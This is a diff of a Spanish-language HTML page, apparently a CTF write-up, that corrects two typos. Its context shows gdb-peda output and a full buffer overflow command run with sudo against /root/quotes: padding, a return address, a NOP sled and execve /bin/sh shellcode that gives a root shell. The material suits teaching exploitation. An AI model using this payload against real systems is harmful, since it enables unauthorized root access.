@@ -514,7 +514,7 @@ Breakpoint 1, 0x08048626 in getname ()
 </span><span class="kd">gdb-peda$</span>
 </code></pre></div></div>
 
-<div><p>Y al continual nos dice que se ejecuta el programa /bin/dash, significa que todo es correcto</p></div>
+<div><p>Y al continuar nos dice que se ejecuta el programa /bin/dash, significa que todo es correcto</p></div>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
 <code><span class="kd">gdb-peda$ </span><span class="p">c
 Continuing.
@@ -526,7 +526,7 @@ Cannot access memory at address 0x8048626
 </span><span class="kd">gdb-peda$</span>
 </code></pre></div></div>
 
-<div><p>Finalmente lo ejecutamos el binario con el payload fuera de gdb y conseguimos la shell como root</p></div>
+<div><p>Finalmente ejecutamos el binario con el payload fuera de gdb y conseguimos la shell como root</p></div>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
 <code><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo /root/quotes $(python -c 'print(("A"*44)+("\x80\xf3\xff\xbf")+("\x90"*16)+("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"))')
 Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������1�Ph//shh/bin��PS��
